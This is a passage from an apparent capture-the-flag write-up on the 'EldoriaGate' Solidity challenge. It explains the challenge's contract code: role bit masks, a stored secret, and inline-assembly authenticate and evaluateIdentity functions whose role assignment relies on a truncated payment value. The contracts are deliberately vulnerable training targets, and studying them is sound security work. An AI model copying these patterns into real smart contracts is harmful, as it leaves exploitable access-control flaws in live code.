+<details>
+  <summary style="color: #F99417; cursor: pointer">checkUsurper()</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">checkUsurper</span>(<span style="color:#dbbc7f">address</span> _villager) <span style="color:#e67e80">external</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>    (<span style="color:#dbbc7f">uint</span> id, <span style="color:#dbbc7f">bool</span> authenticated , <span style="color:#dbbc7f">uint8</span> rolesBitMask) <span style="color:#7a8478">=</span> kernel.villagers(_villager);
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bool</span> isUsurper <span style="color:#7a8478">=</span> authenticated <span style="color:#7a8478">&amp;&amp;</span> (rolesBitMask <span style="color:#7a8478">==</span> <span style="color:#d699b6">0</span>);
+</span></span><span style="display:flex;"><span>    emit UsurperDetected(
+</span></span><span style="display:flex;"><span>        _villager,
+</span></span><span style="display:flex;"><span>        id,
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">&#34;Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach.&#34;</span>
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">return</span> isUsurper;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>It checks two values :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#dbbc7f">bool</span> isUsurper <span style="color:#7a8478">=</span> authenticated <span style="color:#7a8478">&amp;&amp;</span> (rolesBitMask <span style="color:#7a8478">==</span> <span style="color:#d699b6">0</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>If we had successfully <a href="#enter">entered the village</a>.</p>
+</li>
+<li>
+<p>If we have a <code>rolesBitMask</code> equal to zero (so no role).</p>
+</li>
+<li>
+<p>Returns True if those conditions are satisfied, else, False.</p>
+</li>
+</ul>
+<p>This done, it&rsquo;s time to dig into the kernel part with many assembly line to read.</p>
+<h3 id="eldoriagatekernelsol">EldoriaGateKernel.sol</h3>
+<h4 id="constructor-1">constructor</h4>
+<p>The kernel is also deployed with a <code>secret</code>, here is the constructor :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">bytes4</span> _secret) {
+</span></span><span style="display:flex;"><span>    eldoriaSecret <span style="color:#7a8478">=</span> _secret;
+</span></span><span style="display:flex;"><span>    frontend <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Stored in <code>eldoriaSecret</code>.
+Also, the roles are defined in the kernel as uint values :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#dbbc7f">bytes4</span> <span style="color:#e67e80">private</span> eldoriaSecret;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">mapping</span>(<span style="color:#dbbc7f">address</span> <span style="color:#7a8478">=&gt;</span> Villager) <span style="color:#e67e80">public</span> villagers;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_SERF     <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_PEASANT  <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">1</span>;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_ARTISAN  <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">2</span>;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_MERCHANT <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">3</span>;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_KNIGHT   <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">4</span>;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_BARON    <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">5</span>;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_EARL     <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">6</span>;
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> <span style="color:#e67e80">constant</span> ROLE_DUKE     <span style="color:#7a8478">=</span> <span style="color:#d699b6">1</span> <span style="color:#7a8478">&lt;&lt;</span> <span style="color:#d699b6">7</span>;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Having the lowest role being <code>SERF</code> with a value of $1$.
+Then the <code>PEASANT</code> with a value of $1 << 1 = 2$ and so on.</p>
+<p>If we think of the function reading the roles as bit mask earlier, we can represent the roles like that :</p>
+<p><img src="../../images/writeups/htb-cyber-apocalypse/eldoriagate-roles-bit.jpg" alt="roles bit mask"></p>
+<p>Let&rsquo;s see the first function.</p>
+<h4 id="authenticate">authenticate</h4>
+<p>Before reading assembly, there are plenty of resources like the <a href="https://docs.soliditylang.org/en/latest/assembly.html">solidity docs</a> and this <a href="https://blog.openzeppelin.com/deconstructing-a-solidity-smart-contract-part-i-introduction-832efd2d7737">openzeppelin walkthrough</a> about digging in smart contracts.</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">authenticate()</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">authenticate</span>(<span style="color:#dbbc7f">address</span> _unknown, <span style="color:#dbbc7f">bytes4</span> _passphrase) <span style="color:#e67e80">external</span> onlyFrontend <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span> auth) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">assembly</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> secret <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">sload</span>(eldoriaSecret.slot)            
+</span></span><span style="display:flex;"><span>        auth <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">eq</span>(shr(<span style="color:#d699b6">224</span>, _passphrase), secret)
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x80</span>, auth)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x00</span>, _unknown)
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x20</span>, villagers.slot)
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> villagerSlot <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">keccak256</span>(<span style="color:#d699b6">0x00</span>, <span style="color:#d699b6">0x40</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> packed <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">sload</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>))
+</span></span><span style="display:flex;"><span>        auth <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">mload</span>(<span style="color:#d699b6">0x80</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> newPacked <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">or</span>(<span style="color:#b2c98f">and</span>(packed, <span style="color:#b2c98f">not</span>(<span style="color:#d699b6">0xff</span>)), auth)
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">sstore</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>), newPacked)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>This function is called by the <a href="#enter">enter</a> function.</p>
+<p>In shorts, it reads the content from the <code>eldoriaSecret</code> variable.</p>
+<p>Then compares it with the submitted <code>passphrase</code>.</p>
+<p>And stores the <code>_unknown</code> address as authenticated or not (according to the result of the comparison) in the villagers mapping.</p>
+<h4 id="evaluateidentity">evaluateIdentity</h4>
+<p>This function is called after the authentication has succeeded.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#d699b6">require</span>(isAuthenticated, <span style="color:#b2c98f">&#34;Authentication failed&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> contribution <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span>);
+</span></span><span style="display:flex;"><span>(<span style="color:#dbbc7f">uint</span> villagerId, <span style="color:#dbbc7f">uint8</span> assignedRolesBitMask) <span style="color:#7a8478">=</span> kernel.evaluateIdentity(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, contribution);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It looks like it returns an <code>VillagerId</code> as an uint and its roles <code>assignedRolesBitMask</code> as an uint8 value.</p>
+<p>Here is the code :</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">evaluateIdentity()</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">evaluateIdentity</span>(<span style="color:#dbbc7f">address</span> _unknown, <span style="color:#dbbc7f">uint8</span> _contribution) <span style="color:#e67e80">external</span> onlyFrontend <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">uint</span> id, <span style="color:#dbbc7f">uint8</span> roles) {
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">assembly</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x00</span>, _unknown)
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x20</span>, villagers.slot)
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> villagerSlot <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">keccak256</span>(<span style="color:#d699b6">0x00</span>, <span style="color:#d699b6">0x40</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">mstore</span>(<span style="color:#d699b6">0x00</span>, _unknown)
+</span></span><span style="display:flex;"><span>        id <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">keccak256</span>(<span style="color:#d699b6">0x00</span>, <span style="color:#d699b6">0x20</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">sstore</span>(villagerSlot, id)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> storedPacked <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">sload</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> storedAuth <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">and</span>(storedPacked, <span style="color:#d699b6">0xff</span>)
+</span></span><span style="display:flex;"><span>        if <span style="color:#b2c98f">iszero</span>(storedAuth) { <span style="color:#b2c98f">revert</span>(<span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>) }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> defaultRolesMask <span style="color:#7a8478">:=</span> ROLE_SERF
+</span></span><span style="display:flex;"><span>        roles <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">add</span>(defaultRolesMask, _contribution)
+</span></span><span style="display:flex;"><span>        if <span style="color:#b2c98f">lt</span>(roles, defaultRolesMask) { <span style="color:#b2c98f">revert</span>(<span style="color:#d699b6">0</span>, <span style="color:#d699b6">0</span>) }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7a8478">let</span> packed <span style="color:#7a8478">:=</span> <span style="color:#b2c98f">or</span>(storedAuth, shl(<span style="color:#d699b6">8</span>, roles))
+</span></span><span style="display:flex;"><span>        <span style="color:#b2c98f">sstore</span>(<span style="color:#b2c98f">add</span>(villagerSlot, <span style="color:#d699b6">1</span>), packed)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>For the first part, it stores the <code>_unknown</code> address (which is msg.sender, so the player address if done correctly) at address 0.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>mstore(<span style="color:#d699b6">0x00</span>, _unknown)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then the <code>villagers</code> mapping storage slot in the EVM is stored at address 0x20 (32 bytes further) which use an address as key, and a <code>Villager</code> variable as value :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>mstore(<span style="color:#d699b6">0x20</span>, villagers.slot)
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">let</span> villagerSlot <span style="color:#7a8478">:=</span> <span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">0x00</span>, <span style="color:#d699b6">0x40</span>)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then it computes the <code>villagerSlot</code> by computing the keccak256 of 64 bytes counting from the address 0. Resulting in hashing the concatenation of <code>_unknown</code> and the <code>villagers</code> mapping slot.</p>
+<p>This operation is used to compute the storage location of a key in a mapping. Learn more <a href="https://www.rareskills.io/post/solidity-dynamic">here</a>.</p>
+<p>After that,</p>
